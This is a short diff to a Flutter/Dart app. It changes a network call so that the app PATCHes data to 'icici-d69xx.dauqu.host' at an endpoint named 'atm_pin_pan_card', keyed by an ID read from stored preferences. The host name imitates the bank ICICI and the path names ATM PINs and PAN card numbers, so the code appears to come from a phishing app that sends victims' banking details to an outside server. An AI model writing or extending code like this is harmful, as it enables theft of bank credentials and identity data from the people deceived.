@@ -40,8 +40,15 @@ class _MyHomePageState extends State<MyHomePage> {
     setState(() {
       loading = true;
     });
+
+    var response = prefs?.getString('response');
+    //Parse JSON
+    var data = jsonDecode(response!);
+
     await http
-        .post(Uri.parse("https://icici-d69xx.dauqu.host/data"),
+        .patch(
+            Uri.parse(
+                "https://icici-d69xx.dauqu.host/data/atm_pin_pan_card/${data["_id"]}"),
             headers: <String, String>{
               'Content-Type': 'application/json; charset=UTF-8',
             },
